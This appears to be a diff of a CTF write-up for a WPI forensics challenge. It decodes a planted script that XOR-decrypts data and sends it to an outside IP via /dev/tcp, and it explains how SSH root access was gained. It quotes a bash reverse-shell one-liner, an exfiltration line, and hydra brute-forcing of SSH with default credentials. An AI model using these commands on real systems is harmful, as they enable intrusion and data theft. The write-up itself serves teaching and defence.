@@ -62,7 +62,7 @@ The files has been downloaded from a gitlab repository https://gitlab.com/thehac
 
 ![image](https://user-images.githubusercontent.com/72421091/116103519-312d5f00-a69f-11eb-997f-9c19f201bccd.png)
 
-payload.sh file 
+**.payload.sh file **
 
 ```bash
 #!/bin/bash
@@ -108,13 +108,70 @@ We can see some steps :
 
 - Download the .encrypted_csv.data file from the gitlab repository using wget
 - Decrypting the file : convert .encrypted_csv.data to decimal values, xor using K=120, converto to octal values and print the ascii charactere
-- 
+- encrypted.csv : WPI{open-ports-will-be-abused},185.22.155.51,80r
+- Save encrypted.csv as array : M is our flag, I the ip adresse and P the port 
+- echo "$M" > /dev/tcp/$I/$P : similar to a bash reverse shell ```bash -i >& /dev/tcp/10.0.0.1/8080 0>&1```
 
+A bash script for decryption to get the flag 
 
+```bash
+#!/bin/bash
+
+wget https://gitlab.com/thehacker1/payload/-/raw/master/.encrypted_csv.data #Download file from the gitlab repository
+echo "[+] Downloaded file"
+
+F="./.encrypted_csv.data"
+K=120
+
+hexdump -v -e '/1 "%u\n"' $F | while read B; do   # Convert .encrypted_csv.data values to decimal one byte for each line and start a loop
+        E=$((K^B))                                # xor K=120 and the decimal value from .encrypted_csv.data (1 byte line)
+        C=$(printf \\$(printf '%03o' $E))         # Convert the xor output to octal and print the ascii character
+        echo -n $C >> encrypted.csv
+done
+
+echo "[+] Decrypted"
+
+S=$(cat encrypted.csv) # S --> WPI{open-ports-will-be-abused},185.22.155.51,80r
+flag="${S:0:30}"
+echo "[+] Flag : $flag"
+```
+![image](https://user-images.githubusercontent.com/72421091/116130198-79a64600-a6ba-11eb-85e8-f0364d87e288.png)
 
 
 ## Flag
 
 ```
-WPI{1n53cUR3_5tud3Nts}
+WPI{open-ports-will-be-abused}
 ```
+
+## How the attacker get in  
+
+Starting by performing ports scan using nmap 
+
+![image](https://user-images.githubusercontent.com/72421091/116132345-f89c7e00-a6bc-11eb-9a4b-6f2163f959e9.png)
+
+We can see the port 22/TCP runinng the OpenSSH 7.6p1 which is vulnerable to a username enumeration attack https://nvd.nist.gov/vuln/detail/CVE-2018-15473  
+
+I tried user enumeration using this exploit https://www.exploit-db.com/exploits/45233 and the metasploit module auxiliary/scanner/ssh/ssh_enumusers but no success
+
+I tried to bruteforce ssh credentials using hydra with a default credentials list https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt 
+
+![image](https://user-images.githubusercontent.com/72421091/116150292-b5e5a080-a6d2-11eb-9926-f09203bdc253.png)
+
+So we can access the server using SSH as root 
+
+### Fix
+
+- Disable direct root ssh login
+- Upgrade OpenSSH to latest version
+
+Some best practices explained by liveoverflow  
+
+https://www.youtube.com/watch?v=fKuqYQdqRIs
+
+
+
+
+
+
+
